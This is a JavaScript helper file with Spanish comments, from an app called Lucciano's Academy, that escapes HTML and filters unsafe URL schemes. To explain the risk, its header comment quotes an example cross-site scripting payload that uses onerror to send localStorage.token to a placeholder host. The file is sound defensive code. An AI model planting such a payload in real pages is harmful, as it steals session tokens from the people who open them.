/* ============================
   Lucciano's Academy
   services/html.js — Escapado de HTML

   Toda la app arma pantallas con template strings + innerHTML. Eso
   significa que CUALQUIER texto que venga de la planilla (nombre de
   un usuario, título de un curso, URL de una foto) se interpreta como
   HTML si no se escapa antes. Un valor como

       Juan" onerror="fetch('https://malo/'+localStorage.token)

   metido en el campo "foto" de un usuario se ejecuta en la sesión de
   quien abra esa pantalla — típicamente un admin, con su token al
   alcance.

   Usar escaparHtml() en TODO valor que venga de datos, tanto dentro de
   un atributo como en el cuerpo del HTML.
=============================*/

const MAPA = { "&": "&amp;", "<": "&lt;", ">": "&gt;", '"': "&quot;", "'": "&#39;" };

export function escaparHtml(s) {
    return String(s ?? "").replace(/[&<>"']/g, (c) => MAPA[c]);
}

/**
 * Para valores que terminan en src/href. Además de escapar, descarta
 * esquemas ejecutables (javascript:, data:, vbscript:) — escapar solo
 * no alcanza ahí: href="javascript:..." no necesita comillas ni <>
 * para ejecutarse.
 */
export function urlSegura(u) {
    const limpia = String(u ?? "").trim();
    if (!limpia) return "";
    if (/^(https?:|mailto:|#|\/)/i.test(limpia)) return escaparHtml(limpia);
    return "";
}
